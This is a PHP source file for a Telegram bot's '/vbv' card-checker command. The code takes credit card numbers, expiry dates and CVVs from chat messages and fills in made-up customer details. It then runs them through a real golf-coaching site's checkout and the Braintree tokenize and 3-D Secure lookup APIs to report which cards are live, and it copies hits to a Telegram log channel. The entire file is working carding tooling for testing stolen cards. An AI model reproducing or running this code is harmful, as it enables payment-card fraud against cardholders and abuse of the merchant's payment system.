<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


$time_start = microtime(true);
include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";
////////////====[MUTE]====////////////
if(strpos($message, "/vbv ") === 0 || strpos($message, "!vbv ") === 0 || strpos($message, ".vbv ") === 0){
    $antispam = antispamCheck($userId);
    $isPremium = get_prem_info($userId);
    addUser($userId);
    if ($antispam != False && $isPremium == "no"){
        bot('sendmessage',[
            'chat_id'=>$chat_id,
            'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
            'parse_mode'=>'html',
            'reply_to_message_id'=> $message_id
        ]);
        return;

    }else {
        $messageidtoedit1 = bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "<b>Wait for Result...</b>",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 5);
        $separator = explode("|", $lista);
        $cc = $separator[0];
        $mm = $separator[1];
        $yy = $separator[2];
       $cvv = $separator[3];
       $inpt = $lista;

        if (strlen($cc) !== 16 ){
            $cc = str_replace(" ","",$cc);
            $cc = substr($cc, 0, 11). rand(11111, 99999);
        } if (strlen($mm) !== 2) {
            $mm = str_replace(" ","",$mm);
            $mm = $substr.rand(10,12);
        } if (strlen($yy) !== 4) {
            $yy = str_replace(" ","",$yy);
            $yy = rand(2023, 2024);
        }if(strlen($cvv) !== 3){
            $cvv = str_replace(" ","",$cvv);
            $cvv = rand(111,995);
        }
        if(strlen($cc)+strlen($mm)+strlen($yy)+strlen($cvv)==25){
            $lista = "$cc|$mm|$yy|$cvv";
        }
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
            $yy1 = substr($yy, 2, 2);
            $cbin = substr($cc, 0, 1);
            $bin = substr($cc, 0, 6);
            if ($cbin == 5){
                $ctype = 'Mastercard    ';
            } else if ($cbin == 4){
                $ctype = 'Visa';
            }
            $retries = 0;
            ###CHECKER PART###
            $info = json_decode(random_info(),true);
            $fname = $info['fname'];
            $lname = $info['lname'];
            $email = $info['email'];
            $street = $info['street'];
            $city = $info['city'];
            $state = $info['state'];
            $phone = $info['phone'];
            $postcode = $info['postcode'];
            $binlist = json_decode(fbankinfo($bin),true);
            $ccbank = $binlist['Bank'];
            $ccvendor = $binlist['Vendor'];
            $cctype = $binlist['Bank_Info'];
            $cc_country = $binlist['Country'];
            $abn = $binlist['Abn'];
            $cc_emoji = $binlist['emoji'];
            $cookie = RandomString();

            /////////////////////==========[Unavailable if empty]==========////////////////

            $page =  cURL(
                "https://meandmygolf.com/coaching-plans/",
                $headers = [
                    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'content-type: application/x-www-form-urlencoded',
                    'referer: https://meandmygolf.com/coaching-plans/',
                    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53'
                ],
                "coaching_plan_product_id=331743",
                "POST",
                1,
                $cookie
            );
//       $create_pi = GetStr($page, '"asp_pp_ajax_create_pi_nonce":"', '"');

            $checkout =  cURL(
                "https://meandmygolf.com/checkout/",
                $headers = [
                    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "referer: https://meandmygolf.com/coaching-plans/",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
                ],
                "",
                "GET",
                1,
                $cookie
            ); $data = json_decode(base64_decode(GetStr($checkout, 'wc_braintree_client_token = ["', '"')), true);
            $fprint = $data['authorizationFingerprint'];
            $refId = "0_8684a295-52ad-4c48-96e4-36c8aa7b9b4b";
            file_get_contents("https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c897142adb1562e00388ba4&tmEventType=PAYMENT&referenceId=$refId&geolocation=false&origin=Songbird");
            $graphql = cURL(
                "https://payments.braintree-api.com/graphql",
                $headers = [
                    "Accept: */*",
                    "Authorization: Bearer $fprint",
                    "Braintree-Version: 2018-05-10",
                    "Content-Type: application/json",
                    "Origin: https://assets.braintreegateway.com",
                    "Referer: https://assets.braintreegateway.com/",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
                ],
                '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$str.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
                "POST",
                1,
                $cookie
            );
            $token = GetStr($graphql, '"token":"','"');
             $lookup = cURL(
                "https://api.braintreegateway.com/merchants/jns594qhb6x8pc6t/client_api/v1/payment_methods/$token/three_d_secure/lookup",
                $headers = [
                    'Accept: */*',
                    'Accept-Language: en-US,en;q=0.9,mt;q=0.8',
                    'Cache-Control: no-cache',
                    'Connection: keep-alive',
                    'Content-Type: application/json',
                    'Origin: https://www.meandmygolf.com',
                    'Pragma: no-cache',
                    'Referer: https://www.meandmygolf.com/checkout/',
                    'Sec-Fetch-Dest: empty',
                    'Sec-Fetch-Mode: cors',
                    'Sec-Fetch-Site: cross-site',
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53",
                    'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
                    'sec-ch-ua-mobile: ?0',
                    'sec-ch-ua-platform: "Windows"'
                ],
                '{"amount":"104.00","bin":"'.$ccbin.'","dfReferenceId":"'.$refId.'","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.85.2","cardinalDeviceDataCollectionTimeElapsed":'.rand(600,630).',"issuerDeviceDataCollectionTimeElapsed":'.rand(10012,11222).',"issuerDeviceDataCollectionResult":false},"authorizationFingerprint":"'.$fprint.'","braintreeLibraryVersion":"braintree/web/3.85.2","_meta":{"merchantAppId":"meandmygolf.com","platform":"web","sdkVersion":"3.85.2","source":"client","integration":"custom","integrationType":"custom","sessionId":""}}',
                "POST",
                1,
                $cookie
            );
            $status = GetStr($lookup, '"status":"','"');$time = number_format(microtime(true) - $time_start, 2);
            $bank = GetStr($lookup, 'issuingBank":"','"');$issuedCountry = GetStr($lookup, 'countryOfIssuance":"','"');
            $prepaid = GetStr($lookup, 'prepaid":"','"');$healthcare = GetStr($lookup, 'healthcare":"','"');
            $debit = GetStr($lookup, 'debit":"','"');$regulated = GetStr($lookup, 'durbinRegulated":"','"');
            $commercial = GetStr($lookup, 'commercial":"','"');$payroll = GetStr($lookup, 'payroll":"','"');
            $liabilityShifted = GetStr($lookup, 'liabilityShifted":','"');$liabilityShiftedPossible = GetStr($lookup, 'liabilityShiftPossible":','"');
            $threeD_url = GetStr($lookup, 'acsUrl":"','"');
            $eci_flag = GetStr($lookup, 'eciFlag":"','"');
            ###END OF CHECKER PART###
            $status = str_replace('_',' ',$status);

            if(strpos($lookup, 'lookup_not_enrolled') || strpos($lookup, 'authenticate_successful') || strpos($lookup, 'authentication_unavailable') ||strpos($lookup, 'authenticate_attempt_successful')) {
                addTotal();
                addUserTotal($userId);
                addCVV();
                addUserCVV($userId);
                addCCN();
                addUserCCN($userId);
                bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>".strtoupper($status)." ✅
<b>Card -»</b> <code>$inpt</code>
<b>Took -»</b> <b>$time</b><b>s</b>
<b>Gateway -» ThreeD Lookup</b>
<b>------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 

--CARD INFORMATION-BASED ON GATE RESPONSE--</b>
<b>Issued Country -»</b> <b>$issuedCountry</b>
<b>Issued Bank -»</b> <b>$bank</b>
<b>Prepaid -»</b> $prepaid
<b>Healthcare -»</b> $healthcare
<b>Debit -»</b> $debit
<b>Regulated -»</b> $regulated
<b>Commercial -»</b> $commercial
<b>Payroll -»</b> $payroll
<b>--ThreeD SECURE INFO--</b> 
<b>ThreeD Url -»</b> <b>$threeD_url</b>
<b>eciFlag -»</b> $eci_flag
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                    'parse_mode'=>'html',
                    'disable_web_page_preview'=>'true'

                ]);copyLogs("@payamansoyvbv",$chat_id,$messageidtoedit);


            }
            else {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>".strtoupper($status)." ❌
<b>Card -»</b> <code>$inpt</code>
<b>Took -»</b> <b>$time</b><b>s</b>
<b>Gateway -» ThreeD Lookup</b>
<b>------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 

--CARD INFORMATION-BASED ON GATE RESPONSE--</b>
<b>Issued Country -»</b> <b>$issuedCountry</b>
<b>Issued Bank -»</b> <b>$bank</b>
<b>Prepaid -»</b> $prepaid
<b>Healthcare -»</b> $healthcare
<b>Debit -»</b> $debit
<b>Regulated -»</b> $regulated
<b>Commercial -»</b> $commercial
<b>Payroll -»</b> $payroll
<b>--ThreeD SECURE INFO--</b> 
<b>ThreeD Url -»</b> <b>$threeD_url</b>
<b>eciFlag -»</b> $eci_flag
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                    'parse_mode'=>'html',
                    'disable_web_page_preview'=>'true'

                ]);}


        }else{
            bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<code>$inpt</code><b>
INVALID FORMAT -(cmd) XXXXXXXXXXXXXXXXXX|XX|XXXX|XXX</b>",
                'parse_mode'=>'html', 'disable_web_page_preview'=>'true'

            ]);}
    }







}


?>
